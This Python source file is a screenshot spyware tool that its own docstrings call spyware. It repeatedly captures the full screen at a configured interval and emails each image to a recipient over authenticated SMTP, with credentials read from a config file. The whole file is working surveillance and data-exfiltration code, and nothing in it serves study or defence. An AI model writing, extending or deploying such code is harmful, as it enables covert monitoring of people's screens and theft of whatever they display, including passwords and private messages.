import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
from email.mime.text import MIMEText
import mss
from os.path import join, dirname, exists
from configparser import ConfigParser
from os import makedirs, environ
from sys import argv, exit
from typing import List
from time import sleep
from glob import glob


def config_load(filename: str = None, argv: List[str] = argv) -> dict:
    """
    This function loads the configuration using a configuration file.
    It assumes that the configuration values are available in the configuration file.
    """
    CONFIG = ConfigParser()
    default_file_name = "screenSpy.conf"
    default_file_path = join(dirname(__file__), default_file_name)
    env_config_file = environ.get(default_file_name)
    arg_config_file = argv[1] if len(argv) == 2 else None

    # Load configuration from different sources (file, arguments, environment)
    if filename is not None and exists(filename):
        CONFIG.read(filename)
    elif arg_config_file is not None and exists(arg_config_file):
        CONFIG.read(arg_config_file)
    elif env_config_file and exists(env_config_file):
        CONFIG.read(env_config_file)
    elif exists(default_file_path):
        CONFIG.read(default_file_path)
    else:
        print("Configuration file is missing or invalid.")
        return {}

    CONFIG = CONFIG.__dict__["_sections"]

    # Return configuration, without fallbacks
    return {
        "save_filename": CONFIG["SAVE"]["filename"],
        "save_dirname": CONFIG["SAVE"]["dirname"],
        "screenshot_interval": float(CONFIG["TIME"]["screenshot_interval"]),
        "email_sender": CONFIG["EMAIL"]["sender_email"],
        "email_password": CONFIG["EMAIL"]["sender_password"],
        "email_receiver": CONFIG["EMAIL"]["recipient_email"],
        "smtp_server": CONFIG["EMAIL"]["smtp_server"],
        "smtp_port": int(CONFIG["EMAIL"]["smtp_port"]),
    }


def send_email(screenshot_path: str, config: dict) -> None:
    """
    This function sends the screenshot as an email attachment.
    """
    msg = MIMEMultipart()
    msg['From'] = config['email_sender']
    msg['To'] = config['email_receiver']
    msg['Subject'] = 'New Screenshot'

    body = MIMEText('Here is a new screenshot.')
    msg.attach(body)

    try:
        with open(screenshot_path, 'rb') as f:
            img = MIMEImage(f.read())
            img.add_header('Content-Disposition', 'attachment', filename="screenshot.png")
            msg.attach(img)

        server = smtplib.SMTP(config['smtp_server'], config['smtp_port'])
        server.starttls()  # Secure the connection
        server.login(config['email_sender'], config['email_password'])  # Use app password for Gmail
        server.sendmail(config['email_sender'], config['email_receiver'], msg.as_string())
        server.quit()
        print(f"Screenshot sent: {screenshot_path}")
    except smtplib.SMTPAuthenticationError as e:
        print(f"SMTP Authentication Error: {e}")
        print("Check if the app password is correct and 2FA is enabled.")
    except Exception as e:
        print(f"Failed to send email: {e}")

def take_screenshot(screenshot_path: str) -> None:
    """
    This function takes a screenshot using mss and saves it.
    """
    with mss.mss() as sct:
        # Capture a screenshot and save it to the specified path
        screenshot = sct.shot(output=screenshot_path)
        print(f"Screenshot saved at: {screenshot}")

class Daemon:
    """
    This class implements a loop to capture screens while the spyware is running.
    """

    def __init__(self, save_filename: str, save_dirname: str, screenshot_interval: int):
        self.interval = screenshot_interval
        self.run = True
        self.path = join(save_dirname, save_filename)
        self.increment = len(glob(self.path))

    def run_for_ever(self, config: dict) -> None:
        """
        This function takes the screenshot and sleeps in a loop.
        """
        makedirs(config['save_dirname'], exist_ok=True)
        increment = self.increment
        interval = self.interval

        while self.run:
            screenshot_path = self.path.replace("*", str(increment))
            take_screenshot(screenshot_path)  # Use mss for taking screenshots
            send_email(screenshot_path, config)  # Send the screenshot via email
            increment += 1
            if self.run:
                sleep(interval)

def main(config_filename: str = None, argv: List[str] = argv) -> int:
    """
    This function executes this script from the command line.
    """
    config = config_load(filename=config_filename, argv=argv)

    if not config:
        print("Configuration file is missing or invalid.")
        return 1

    save_filename = config['save_filename']
    save_dirname = config['save_dirname']
    screenshot_interval = config['screenshot_interval']

    daemon = Daemon(save_filename, save_dirname, screenshot_interval)

    try:
        daemon.run_for_ever(config)
    except KeyboardInterrupt:
        daemon.run = False

    return 0

if __name__ == "__main__":
    print("Starting the screenshot spy...")
    exit(main())
